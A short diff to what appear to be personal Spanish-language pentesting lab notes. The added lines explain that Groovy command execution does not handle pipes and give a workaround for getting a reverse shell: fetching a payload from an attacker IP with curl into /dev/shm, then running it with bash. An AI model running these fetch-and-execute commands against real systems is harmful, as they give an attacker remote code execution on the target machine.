@@ -58,6 +58,19 @@ No les gustan las shells dentro del mismo string no lo manejan bien como:
 
 > My first attempt is always to try a bash reverse shell, but I couldn’t get it to work here. A lot of times languages like Java and Groovy don’t handle redirects and pipes inside command execution, and this shell is full of them.
 
+Otro ejemplo es esto 
+
+> Groovy not handling pipes.
+
+> curl http://10.10.14.6/rev|bash
+
+Entonces se tendria que ejecutar asi:
+
+> curl http://10.10.14.6/rev -o /dev/shm/rev
+
+Y despues ya 
+
+> bash /dev/shm/rev
 
 ## Kali Linux con WLS
 
